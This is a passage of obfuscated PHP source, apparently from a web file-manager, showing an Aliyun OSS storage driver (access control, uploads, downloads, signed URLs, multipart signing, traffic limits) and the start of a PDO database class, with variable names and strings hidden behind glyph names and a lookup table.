$¿—≈Ã∏Õ == $¢â‚‡∞´[1477] || $¿—≈Ã∏Õ == $¢â‚‡∞´[627] ? !0 : !1; } public function canWrite($Î¯◊Û‘Ù) { $¶ ∂óöÈ = $this->pathAcl($Î¯◊Û‘Ù); return $¶ ∂óöÈ == $_SERVER[ß⁄ˆÇ†Œ][627] ? !0 : !1; } public function pathAcl($éíç¸û∂) { $˜„–îÃ¿ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $˜ÏØ÷¸‡ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($éíç¸û∂)); } catch (OSS\Core\OssException $ÅÜ“é·£) { $this->writeLog(__FUNCTION__ . $˜„–îÃ¿[214] . $ÅÜ“é·£->getMessage()); return !1; } $±∏Ù∑®Ç = $˜ÏØ÷¸‡ == $˜„–îÃ¿[37] ? $this->bucketAcl : $˜ÏØ÷¸‡; if ($±∏Ù∑®Ç == $˜„–îÃ¿[1478]) { return $˜„–îÃ¿[1477]; } if ($±∏Ù∑®Ç == $˜„–îÃ¿[1479]) { return $˜„–îÃ¿[627]; } return $±∏Ù∑®Ç; } private function chmodPath($≤±æüÓü, $Ãá™›  = '') { $ˆ≤©«Ã∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $ç¡Ä‚™É = empty($Ãá™› ) ? $ˆ≤©«Ã∑[1479] : $Ãá™› ; $‡ºÀªÎò = array($ˆ≤©«Ã∑[37], $ˆ≤©«Ã∑[229], $ˆ≤©«Ã∑[1478], $ˆ≤©«Ã∑[1479]); if (!in_array($ç¡Ä‚™É, $‡ºÀªÎò)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($≤±æüÓü), $ç¡Ä‚™É); } catch (OSS\Core\OssException $ªäˆ›ºØ) { $this->writeLog(__FUNCTION__ . $ˆ≤©«Ã∑[214] . $ªäˆ›ºØ->getMessage()); return !1; } return !0; } public function getContent($»ÁöÛãË) { return $this->fileSubstr($»ÁöÛãË, -1); } public function setContent($˜í“¸´, $Â¡≠öˆ∞ = '') { $Ò„¨”èÕ =& $_SERVER[ß⁄ˆÇ†Œ]; try { $ŸÑ∞ò¿ù = $this->trafficLimit($Ò„¨”èÕ[1480]); $¨÷Ú§ûµ = $this->client->putObject($this->bucket, $this->pathEncode($˜í“¸´), $Â¡≠öˆ∞, $ŸÑ∞ò¿ù); } catch (OSS\Core\OssException $£Ãº£◊) { $this->writeLog(__FUNCTION__ . $Ò„¨”èÕ[214] . $£Ãº£◊->getMessage()); return !1; } $ëùÒèú = array($Ò„¨”èÕ[1474] => trim($¨÷Ú§ûµ[$Ò„¨”èÕ[1471]], $Ò„¨”èÕ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($˜í“¸´))); $this->updateObjMeta($˜í“¸´, $ëùÒèú); return isset($¨÷Ú§ûµ[$Ò„¨”èÕ[1481]][$Ò„¨”èÕ[292]]) ? !0 : !1; } private function updateObjMeta($éÆÔÏºø, $≠±Ñ≥Ç) { $éÆÔÏºø = $this->pathEncode($éÆÔÏºø); try { $–í˛∞Ô∑ = array(OSS\OssClient::OSS_HEADERS => $≠±Ñ≥Ç); $this->client->copyObject($this->bucket, $éÆÔÏºø, $this->bucket, $éÆÔÏºø, $–í˛∞Ô∑); } catch (OSS\Core\OssException $◊˛úÖ ) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $◊˛úÖ ->getMessage()); return !1; } return !0; } public function upload($‘í˚€¨¶, $ö©≠¡—¶, $Û≥¥ƒ˘˛ = false, $¥–ÀÊ¶⁄ = REPEAT_REPLACE) { $íêÓÕ‰Ú =& $_SERVER[ß⁄ˆÇ†Œ]; $óñ√Î„Ω = trim($‘í˚€¨¶, $íêÓÕ‰Ú[8]); $íÃÒÈÁÇ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($íêÓÕ‰Ú[1474] => @md5_file($ö©≠¡—¶)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘í˚€¨¶))); $íÃÒÈÁÇ = $this->trafficLimit($íêÓÕ‰Ú[1480], $íÃÒÈÁÇ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($óñ√Î„Ω), $ö©≠¡—¶, $íÃÒÈÁÇ); } catch (OSS\Core\OssException $¿ù¡•Ù‹) { $this->writeLog(__FUNCTION__ . $íêÓÕ‰Ú[214] . $¿ù¡•Ù‹->getMessage()); return !1; } return $this->getPathOuter($‘í˚€¨¶); } public function getHost() { $∞Û∆≤ñﬁ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸ü∂Õ¯Å = explode($∞Û∆≤ñﬁ[210], parent::getHost()); return $¸ü∂Õ¯Å[0] . $∞Û∆≤ñﬁ[210] . $this->bucket . $∞Û∆≤ñﬁ[10] . $¸ü∂Õ¯Å[1]; } public function uploadFormData($¯’≥µœÊ, $œä¡∑ûâ = 3600) { $ùΩœ˚§Ω =& $_SERVER[ß⁄ˆÇ†Œ]; if (!($¿ß‹‹û± = $this->getHost())) { return !1; } $“áøœ‚ô = $œä¡∑ûâ; $∆Ù‹∑˝ = date($ùΩœ˚§Ω[1482], time() + $“áøœ‚ô); $·€∂§¸ö = new DateTime($∆Ù‹∑˝); $»∫ñúŸ¶ = $·€∂§¸ö->format(DateTime::ISO8601); $ÀÜ«Ûªì = strpos($»∫ñúŸ¶, $ùΩœ˚§Ω[381]); $»∫ñúŸ¶ = substr($»∫ñúŸ¶, 0, $ÀÜ«Ûªì) . $ùΩœ˚§Ω[1483]; $œ¬«ÆÉ› = 1048576000 * 5; $ ÔÅ•Ù’ = $this->pathFather($¯’≥µœÊ); $åÃõªÒÂ = array($ùΩœ˚§Ω[275] => $»∫ñúŸ¶, $ùΩœ˚§Ω[278] => array(array($ùΩœ˚§Ω[1484], 0, $œ¬«ÆÉ›), array($ùΩœ˚§Ω[281], $ùΩœ˚§Ω[282], $ ÔÅ•Ù’))); $©ÎÜñ§Â = base64_encode(json_encode($åÃõªÒÂ)); $ì¿ù€Œ˛ = base64_encode(hash_hmac($ùΩœ˚§Ω[263], $©ÎÜñ§Â, $this->secret, !0)); $âÊ‚≤≥‡ = array($ùΩœ˚§Ω[293] => $©ÎÜñ§Â, $ùΩœ˚§Ω[1485] => $this->accessKey, $ùΩœ˚§Ω[285] => $ùΩœ˚§Ω[274], $ùΩœ˚§Ω[1486] => $ì¿ù€Œ˛, $ùΩœ˚§Ω[208] => $¿ß‹‹û±); $âÊ‚≤≥‡ = $this->trafficLimit($ùΩœ˚§Ω[1480], $âÊ‚≤≥‡); return $âÊ‚≤≥‡; } public function multiUploadFormData($·ßÏÉÑΩ, $„–Î≥ƒÃ = 3600) { $—Ñ≈É´ø =& $_SERVER[ß⁄ˆÇ†Œ]; if (!($ë¡ÿ◊ÿÃ = $this->getHost())) { return !1; } $õÊ™Ì¶ø = $this->trafficLimit($—Ñ≈É´ø[1480]); $≠òÜ®¯∞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($·ßÏÉÑΩ), $õÊ™Ì¶ø); return array($—Ñ≈É´ø[254] => $≠òÜ®¯∞, $—Ñ≈É´ø[208] => $ë¡ÿ◊ÿÃ . $—Ñ≈É´ø[8] . $this->pathEncode($·ßÏÉÑΩ), $—Ñ≈É´ø[255] => gmdate($—Ñ≈É´ø[1487]), $—Ñ≈É´ø[97] => $·ßÏÉÑΩ); } public function multiUploadAuthData($·û—›„Ü, $≤Åàì°¢ = array()) { $åÎ≠≠Ÿ∆ =& $_SERVER[ß⁄ˆÇ†Œ]; $ßòæ÷ÌÉ = isset($≤Åàì°¢[$åÎ≠≠Ÿ∆[255]]) ? $≤Åàì°¢[$åÎ≠≠Ÿ∆[255]] : gmdate($åÎ≠≠Ÿ∆[1487]); $∑ƒáóÿ≈ = isset($≤Åàì°¢[$åÎ≠≠Ÿ∆[169]]) ? $≤Åàì°¢[$åÎ≠≠Ÿ∆[169]] : $åÎ≠≠Ÿ∆[12]; $ïÄ¢‡ã§ = $·û—›„Ü; if (isset($≤Åàì°¢[$åÎ≠≠Ÿ∆[97]])) { $ïÄ¢‡ã§ = $≤Åàì°¢[$åÎ≠≠Ÿ∆[97]]; unset($≤Åàì°¢[$åÎ≠≠Ÿ∆[97]]); } if (isset($≤Åàì°¢[$åÎ≠≠Ÿ∆[256]])) { $≤Åàì°¢[$åÎ≠≠Ÿ∆[255]] = $ßòæ÷ÌÉ; return $this->listUploadParts($ïÄ¢‡ã§, $≤Åàì°¢); } $Úàﬂ≥¥¶ = array($åÎ≠≠Ÿ∆[257], $åÎ≠≠Ÿ∆[12], $åÎ≠≠Ÿ∆[123], $ßòæ÷ÌÉ, "\170\55\157\x73\x73\55\x64\141\164\145\x3a{$ßòæ÷ÌÉ}", $åÎ≠≠Ÿ∆[8] . $this->bucket . $åÎ≠≠Ÿ∆[8] . $ïÄ¢‡ã§ . $∑ƒáóÿ≈); if (strpos($∑ƒáóÿ≈, $åÎ≠≠Ÿ∆[258]) === 0) { $Úàﬂ≥¥¶[0] = $åÎ≠≠Ÿ∆[259]; if ($ƒıˆ¿îÚ = $this->trafficLimit($åÎ≠≠Ÿ∆[1480])) { $ïÄ¢‡ã§ = $åÎ≠≠Ÿ∆[1488]; array_splice($Úàﬂ≥¥¶, 5, 0, $ïÄ¢‡ã§ . $åÎ≠≠Ÿ∆[4] . $ƒıˆ¿îÚ[$ïÄ¢‡ã§]); } } if (isset($≤Åàì°¢[$åÎ≠≠Ÿ∆[260]]) && $≤Åàì°¢[$åÎ≠≠Ÿ∆[260]] == $åÎ≠≠Ÿ∆[261]) { $Úàﬂ≥¥¶[0] = $åÎ≠≠Ÿ∆[261]; } if (!empty($≤Åàì°¢[$åÎ≠≠Ÿ∆[1489]])) { $˜ªà∫‘æ = array_merge(array($Úàﬂ≥¥¶[4]), $≤Åàì°¢[$åÎ≠≠Ÿ∆[1489]]); sort($˜ªà∫‘æ); $Úàﬂ≥¥¶[4] = implode($åÎ≠≠Ÿ∆[262], $˜ªà∫‘æ); } $ÆÖ¥Çóî = implode($åÎ≠≠Ÿ∆[262], $Úàﬂ≥¥¶); $ ·ÃÂùç = base64_encode(hash_hmac($åÎ≠≠Ÿ∆[263], $ÆÖ¥Çóî, $this->secret, !0)); $Äîúû‘ú = $åÎ≠≠Ÿ∆[1457] . $this->accessKey . $åÎ≠≠Ÿ∆[4] . $ ·ÃÂùç; if (strpos($∑ƒáóÿ≈, $åÎ≠≠Ÿ∆[258]) === 0) { $Äîúû‘ú = array($åÎ≠≠Ÿ∆[265] => $Äîúû‘ú, $åÎ≠≠Ÿ∆[255] => $ßòæ÷ÌÉ); if ($ƒıˆ¿îÚ) { $Äîúû‘ú = array_merge($Äîúû‘ú, $ƒıˆ¿îÚ); } } return $Äîúû‘ú; } public function listUploadParts($„û—Ù–≠, $”ı±¥’ï) { $¿ƒâóº≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $ô–˘ÀÛ∫ = parse_url_query($”ı±¥’ï[$¿ƒâóº≥[169]]); $ÚÒëêøí = $this->client->listParts($this->bucket, $this->pathEncode($„û—Ù–≠), $ô–˘ÀÛ∫[$¿ƒâóº≥[254]]); $˘Œ„ó¿Ë = $ÚÒëêøí->getListPart(); $îÅüô∫Ó = array(); foreach ($˘Œ„ó¿Ë as $∆¯¡Ì√å) { $îÅüô∫Ó[] = array($¿ƒâóº≥[308] => $∆¯¡Ì√å->getPartNumber(), $¿ƒâóº≥[309] => trim($∆¯¡Ì√å->getETag(), $¿ƒâóº≥[121])); } unset($”ı±¥’ï[$¿ƒâóº≥[256]], $”ı±¥’ï[$¿ƒâóº≥[260]]); $éÕº»°√ = $this->multiUploadAuthData($„û—Ù–≠, $”ı±¥’ï); if (empty($éÕº»°√)) { return !1; } return array($¿ƒâóº≥[265] => $éÕº»°√, $¿ƒâóº≥[255] => $”ı±¥’ï[$¿ƒâóº≥[255]], $¿ƒâóº≥[267] => $îÅüô∫Ó); } public function download($Ö´∫Ë¿Ã, $üÓâåëÕ) { $Ωé§¢ùú =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isFolder($Ö´∫Ë¿Ã)) { return !1; } try { $∏¢ßª±ì = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $üÓâåëÕ); $∏¢ßª±ì = $this->trafficLimit($Ωé§¢ùú[112], $∏¢ßª±ì); $this->client->getObject($this->bucket, $this->pathEncode($Ö´∫Ë¿Ã), $∏¢ßª±ì); } catch (OSS\Core\OssException $ó˙∞ÔÆ≤) { $this->writeLog(__FUNCTION__ . $Ωé§¢ùú[214] . $ó˙∞ÔÆ≤->getMessage()); return !1; } return $üÓâåëÕ; } public function fileSubstr($¬÷ÔÏ‚§, $”…°€Ì… = 0, $ÕÑÇêôµ = false) { if ($”…°€Ì… === -1) { $’åõÅÒ  = array(); } else { if ($ÕÑÇêôµ === !1) { $°—¸°îÆ = $this->size($¬÷ÔÏ‚§); } else { $°—¸°îÆ = $”…°€Ì… + $ÕÑÇêôµ - 1; } $’åõÅÒ  = array(OSS\OssClient::OSS_RANGE => "{$”…°€Ì…}\x2d{$°—¸°îÆ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¬÷ÔÏ‚§), $’åõÅÒ ); } catch (OSS\Core\OssException $°õŒ“°Ã) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][214] . $°õŒ“°Ã->getMessage()); think_exception($°õŒ“°Ã->getMessage()); return !1; } } private function trafficLimit($É©˜Øﬁ“, $Ü£ƒ©∏◊ = array()) { $¬√«∆ŒÁ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($É©˜Øﬁ“ == $¬√«∆ŒÁ[1480] && $this->isUploadServer() || $É©˜Øﬁ“ == $¬√«∆ŒÁ[112] && $this->isFileOutServer()) { return $Ü£ƒ©∏◊; } $Ö’ó¥Ö˜ = floatval($GLOBALS[$¬√«∆ŒÁ[6]][$¬√«∆ŒÁ[92]][$¬√«∆ŒÁ[110]][$É©˜Øﬁ“]) * 1024 * 1024 * 8; if (!$Ö’ó¥Ö˜) { return $Ü£ƒ©∏◊; } $Ö’ó¥Ö˜ = $Ö’ó¥Ö˜ < 819200 ? 819200 : ($Ö’ó¥Ö˜ > 838860800 ? 838860800 : $Ö’ó¥Ö˜); $Ü£ƒ©∏◊[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ö’ó¥Ö˜); return $Ü£ƒ©∏◊; } public function link($´÷Úñé, $‰˜√¿ãÔ = array()) { $¡Ø˛ËΩ’ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->exist($´÷Úñé) || $this->isFolder($´÷Úñé)) { return !1; } try { $‰˜√¿ãÔ = $this->trafficLimit($¡Ø˛ËΩ’[112], $‰˜√¿ãÔ); $ô¬¢ÑÁ— = $this->client->signUrl($this->bucket, $this->pathEncode($´÷Úñé), 3600 * 12, $¡Ø˛ËΩ’[261], $‰˜√¿ãÔ); return $this->getCdnLink($ô¬¢ÑÁ—); } catch (OSS\Core\OssException $Ä°åÕö˙) { $this->writeLog(__FUNCTION__ . $¡Ø˛ËΩ’[214] . $Ä°åÕö˙->getMessage()); return !1; } } public function fileOut($∂ÄﬂÕÛü, $‘êÉ¥É◊ = false, $ªÊ§—úœ = false, $ˆ¶¯˘¥≥ = '') { $ÿÁ‡ÉÙÄ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($∂ÄﬂÕÛü, $‘êÉ¥É◊, $ªÊ§—úœ, $ˆ¶¯˘¥≥); } if (!$ªÊ§—úœ) { $ªÊ§—úœ = $this->pathThis($∂ÄﬂÕÛü); } $ªÊ§—úœ = rawurlencode($ªÊ§—úœ); $Êúö§Æè = get_file_mime(get_path_ext($ªÊ§—úœ)); if ($Êúö§Æè == $ÿÁ‡ÉÙÄ[248]) { return parent::fileOut($∂ÄﬂÕÛü, $‘êÉ¥É◊, $ªÊ§—úœ, $ˆ¶¯˘¥≥); } $‘êÉ¥É◊ = $‘êÉ¥É◊ ? $ÿÁ‡ÉÙÄ[1490] : $ÿÁ‡ÉÙÄ[1491]; $êß¿Øªè = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÿÁ‡ÉÙÄ[1492] . rawurlencode("{$‘êÉ¥É◊}\73\146\x69\154\145\x6e\x61\155\145\75{$ªÊ§—úœ}")); $êß¿Øªè[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÿÁ‡ÉÙÄ[1493] . rawurlencode($Êúö§Æè); $ΩïÖ¶ ¬ = $this->link($∂ÄﬂÕÛü, $êß¿Øªè); $this->fileOutLink($ΩïÖ¶ ¬); } public function fileOutServer($ÎŸŸÆÚﬂ, $ëˆ∆›ÄÆ = false, $ŸÈóﬁ≠Ê = false, $Æ©óŒ„¶ = '') { parent::fileOut($ÎŸŸÆÚﬂ, $ëˆ∆›ÄÆ, $ŸÈóﬁ≠Ê, $Æ©óŒ„¶); } public function fileOutImage($‚å°Ãàá, $Ÿ…•⁄Á… = 250) { if ($this->size($‚å°Ãàá) > 1024 * 1024 * 20) { return $this->fileOutImageServer($‚å°Ãàá, $Ÿ…•⁄Á…); } $‚∫ﬁ–¡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ß⁄ˆÇ†Œ][1454] . $Ÿ…•⁄Á…); $¨ñÔÀ÷Ÿ = $this->link($‚å°Ãàá, $‚∫ﬁ–¡); $this->fileOutLink($¨ñÔÀ÷Ÿ); } public function fileOutImageServer($™åì¥ÒÏ, $î–∂∞Õ = 250) { parent::fileOutImage($™åì¥ÒÏ, $î–∂∞Õ); } public function fileOutLink($≠î§∆›Ä) { $›∏∏–™∆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->isCdnHost() && substr($≠î§∆›Ä, 0, 7) == $›∏∏–™∆[313]) { $≠î§∆›Ä = $›∏∏–™∆[314] . substr($≠î§∆›Ä, 7); } header($›∏∏–™∆[175] . $≠î§∆›Ä); die; } public function hashMd5($ÕÖ‚Î∞Æ, $÷§Ùç˝• = '') { $“Îù˝‹˝ =& $_SERVER[ß⁄ˆÇ†Œ]; $ˆØè’òû = $this->_objectMeta($ÕÖ‚Î∞Æ); if (!$ˆØè’òû) { return $“Îù˝‹˝[12]; } if (!isset($ˆØè’òû[$“Îù˝‹˝[1474]]) && !empty($÷§Ùç˝•)) { $ˆúºµ‚˝ = $this->updateObjMeta($ÕÖ‚Î∞Æ, array($“Îù˝‹˝[1474] => $÷§Ùç˝•)); $ˆØè’òû[$“Îù˝‹˝[1474]] = $ˆúºµ‚˝ ? $÷§Ùç˝• : $“Îù˝‹˝[12]; } return isset($ˆØè’òû[$“Îù˝‹˝[1474]]) ? strtolower($ˆØè’òû[$“Îù˝‹˝[1474]]) : $“Îù˝‹˝[12]; } public function size($ì•…‡¿ù) { $§¢Ãúçﬁ = $this->objectMeta($ì•…‡¿ù); return $§¢Ãúçﬁ ? $§¢Ãúçﬁ[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function info($Á≈∂é˛¡) { if ($this->isFolder($Á≈∂é˛¡)) { return $this->folderInfo($Á≈∂é˛¡); } else { if ($this->isFile($Á≈∂é˛¡)) { return $this->fileInfo($Á≈∂é˛¡); } } return !1; } public function exist($ÃﬁàÏ¢ì) { return $this->isFile($ÃﬁàÏ¢ì) || $this->isFolder($ÃﬁàÏ¢ì); } public function isFile($√à∏Øµä) { return !$this->isFolder($√à∏Øµä) && $this->objectMeta($√à∏Øµä); } public function isFolder($ÿúñ€–Á) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][179], $ÿúñ€–Á); } protected function objectMeta($ª˛µÏùÌ) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][181], $ª˛µÏùÌ); } protected function _objectMeta($ñ‹ƒ◊ªÅ) { $èúÎÅ‚ˆ =& $_SERVER[ß⁄ˆÇ†Œ]; try { $µ˝∞±ù´ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ñ‹ƒ◊ªÅ)); } catch (OSS\Core\OssException $¸¡§éËæ) { $this->writeLog(__FUNCTION__ . $èúÎÅ‚ˆ[214] . $¸¡§éËæ->getMessage()); $µ˝∞±ù´ = !1; } if ($µ˝∞±ù´) { $µ˝∞±ù´[$èúÎÅ‚ˆ[79]] = intval($µ˝∞±ù´[$èúÎÅ‚ˆ[1472]]); } return $µ˝∞±ù´; } protected function _isFolder($ÑµòÖÿΩ) { $ç˘œàüπ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ÑµòÖÿΩ == $ç˘œàüπ[12] || $ÑµòÖÿΩ == $ç˘œàüπ[8]) { return !0; } $ÿ›°€Œ¿ = array($ç˘œàüπ[1467] => $ç˘œàüπ[8], $ç˘œàüπ[1468] => rtrim($ÑµòÖÿΩ, $ç˘œàüπ[8]) . $ç˘œàüπ[8], $ç˘œàüπ[1469] => 1, $ç˘œàüπ[1470] => $ç˘œàüπ[12]); $ùıœ√ãÙ = $this->client->listObjects($this->bucket, $ÿ›°€Œ¿); if ($ùıœ√ãÙ->getObjectList() || $ùıœ√ãÙ->getPrefixList()) { return !0; } return !1; } public function writeLog($„ñãıÖ‹ = '', $«ä»∆ûô = false) { $¡Ê˜ñÉË =& $_SERVER[ß⁄ˆÇ†Œ]; $ÅÔÍ´·Ó = in_array(ACTION, array($¡Ê˜ñÉË[212], $¡Ê˜ñÉË[213])); if (!$ÅÔÍ´·Ó && !GLOBAL_DEBUG) { return; } $˙°ÃßÌΩ = 0; if (stripos($„ñãıÖ‹, $¡Ê˜ñÉË[1494]) !== !1) { $˙°ÃßÌΩ = 1; $®˘ÀÀÛû = explode($¡Ê˜ñÉË[1495], $„ñãıÖ‹); $„ñãıÖ‹ = !empty($®˘ÀÀÛû[1]) ? $®˘ÀÀÛû[1] : $„ñãıÖ‹; } else { if (stripos($„ñãıÖ‹, $¡Ê˜ñÉË[1496])) { $˙°ÃßÌΩ = 2; $®˘ÀÀÛû = explode($¡Ê˜ñÉË[1496], $„ñãıÖ‹); $®˘ÀÀÛû = explode($¡Ê˜ñÉË[4], $®˘ÀÀÛû[0]); $„ñãıÖ‹ = !empty($®˘ÀÀÛû[1]) ? $®˘ÀÀÛû[1] : $„ñãıÖ‹; } } if ($ÅÔÍ´·Ó && I18n::getType() == $¡Ê˜ñÉË[1497]) { if ($˙°ÃßÌΩ == 1) { $„ñãıÖ‹ = str_replace($¡Ê˜ñÉË[1498], $¡Ê˜ñÉË[1499], $„ñãıÖ‹); } else { if ($˙°ÃßÌΩ == 2) { $®˘ÀÀÛû = explode($¡Ê˜ñÉË[214], $®˘ÀÀÛû[0]); $®öπ…õ» = isset($®˘ÀÀÛû[1]) ? $®˘ÀÀÛû[1] : $¡Ê˜ñÉË[12]; $†ôï≤åò = array($¡Ê˜ñÉË[1500] => $¡Ê˜ñÉË[1501], $¡Ê˜ñÉË[1502] => $¡Ê˜ñÉË[1503], $¡Ê˜ñÉË[1504] => $¡Ê˜ñÉË[1505], $¡Ê˜ñÉË[1506] => $¡Ê˜ñÉË[1507], $¡Ê˜ñÉË[1508] => $¡Ê˜ñÉË[1509], $¡Ê˜ñÉË[1510] => $¡Ê˜ñÉË[1511], $¡Ê˜ñÉË[1512] => $¡Ê˜ñÉË[1513], $¡Ê˜ñÉË[1514] => $¡Ê˜ñÉË[1515], $¡Ê˜ñÉË[1516] => $¡Ê˜ñÉË[1517], $¡Ê˜ñÉË[1518] => $¡Ê˜ñÉË[1519]); if (isset($†ôï≤åò[$®öπ…õ»])) { $„ñãıÖ‹ = $†ôï≤åò[$®öπ…õ»]; } } } if (stripos($„ñãıÖ‹, $¡Ê˜ñÉË[1520])) { $„ñãıÖ‹ = $¡Ê˜ñÉË[1521]; } } if (!trim($„ñãıÖ‹)) { return; } parent::writeLog(trim($„ñãıÖ‹), $«ä»∆ûô); } } goto eüãÕ≠æÃô; c—ÌñÍª®œ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÆŒ≥Ãı± = '') { $Ì√‡æª‡ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!class_exists($Ì√‡æª‡[988])) { think_exception(think_lang($Ì√‡æª‡[14]) . $Ì√‡æª‡[989]); } if (!empty($ÆŒ≥Ãı±)) { $this->config = $ÆŒ≥Ãı±; if (empty($this->config[$Ì√‡æª‡[17]])) { $this->config[$Ì√‡æª‡[17]] = array(); } } } public function connect($¿ª∞ÙÜï = '', $ü™å¬≥∞ = 0) { $øû»ÏÄ˚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->linkID[$ü™å¬≥∞])) { if (empty($¿ª∞ÙÜï)) { $¿ª∞ÙÜï = $this->config; } $˜Úµú√ü = !empty($¿ª∞ÙÜï[$øû»ÏÄ˚[17]][$øû»ÏÄ˚[18]]) ? $¿ª∞ÙÜï[$øû»ÏÄ˚[17]][$øû»ÏÄ˚[18]] : $this->pconnect; if ($˜Úµú√ü) { $¿ª∞ÙÜï[$øû»ÏÄ˚[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ü™å¬≥∞] = new PDO($¿ª∞ÙÜï[$øû»ÏÄ˚[990]], $¿ª∞ÙÜï[$øû»ÏÄ˚[962]], $¿ª∞ÙÜï[$øû»ÏÄ˚[963]], $¿ª∞ÙÜï[$øû»ÏÄ˚[17]]); } catch (PDOException $Ω›ÃÙÈ¡) { think_exception($Ω›ÃÙÈ¡->getMessage()); } $this->dbType = $this->_getDsnType($¿ª∞ÙÜï[$øû»ÏÄ˚[990]]); if (in_array($this->dbType, array($øû»ÏÄ˚[991], $øû»ÏÄ˚[992], $øû»ÏÄ˚[993], $øû»ÏÄ˚[994]))) { think_exception($øû»ÏÄ˚[995] . $this->dbType . $øû»ÏÄ˚[996] . $this->dbType . $øû»ÏÄ˚[997]); } if (!$this->linkID[$ü™å¬≥∞]) { think_exception($øû»ÏÄ˚[998]); } try { $this->linkID[$ü™å¬≥∞]->exec($øû»ÏÄ˚[999] . think_config($øû»ÏÄ˚[965])); } catch (Exception $Ω›ÃÙÈ¡) { } $this->connected = !0; if (1 != think_config($øû»ÏÄ˚[22])) { unset($this->config); } } return $this->linkID[$ü™å¬≥∞]; } public function free() { $this->PDOStatement = null; } public function query($ñ ∫”«ı, $˛œ§∆õò = array()) { $ÖÌ‘ıÆı =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñ ∫”«ı; if (!empty($˛œ§∆õò)) { $this->queryStr .= $ÖÌ‘ıÆı[1000] . print_r($˛œ§∆õò, !0) . $ÖÌ‘ıÆı[1001]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÖÌ‘ıÆı[23], 1); think_status($ÖÌ‘ıÆı[24]); $this->PDOStatement = $this->_linkID->prepare($ñ ∫”«ı); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $´Ú§ÕûÊ = $this->PDOStatement->execute($˛œ§∆õò); $this->debug(); if (!1 === $´Ú§ÕûÊ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($”´Ìêûï, $·˙¢Ä∑˜ = array()) { $ç˚¬‡–© =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”´Ìêûï; if (!empty($·˙¢Ä∑˜)) { $this->queryStr .= $ç˚¬‡–©[1000] . print_r($·˙¢Ä∑˜, !0) . $ç˚¬‡–©[1001]; } $˜¿Ë˘ñü = !1; if ($this->dbType == $ç˚¬‡–©[994]) { if (preg_match($ç˚¬‡–©[1002], $this->queryStr, $≠ââπ∏≥)) { $this->table = think_config($ç˚¬‡–©[1003]) . str_ireplace(think_config($ç˚¬‡–©[1004]), $ç˚¬‡–©[329], $≠ââπ∏≥[2]); $˜¿Ë˘ñü = (bool) $this->query($ç˚¬‡–©[1005] . strtoupper($this->table) . $ç˚¬‡–©[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ç˚¬‡–©[25], 1); think_status($ç˚¬‡–©[24]); $this->PDOStatement = $this->_linkID->prepare($”´Ìêûï); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $“ËÜ‹ÂÓ = $this->PDOStatement->execute($·˙¢Ä∑˜); $this->debug(); if (!1 === $“ËÜ‹ÂÓ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($˜¿Ë˘ñü || preg_match($ç˚¬‡–©[1006], $”´Ìêûï)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±√ÊèÎÄ = $this->_linkID->commit(); $this->transTimes = 0; if (!$±√ÊèÎÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $æ™Ó§ÙÑ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$æ™Ó§ÙÑ) { $this->error(); return !1; } } return !0; } private function getAll() { $ë∂¿“Ò = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ë∂¿“Ò); return $ë∂¿“Ò; } public function getFields($≥ÜïåΩá) { $µ£“≥ïù =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (think_config($µ£“≥ïù[1007])) { $™ïµ≤êœ = str_replace($µ£“≥ïù[1008], $≥ÜïåΩá, 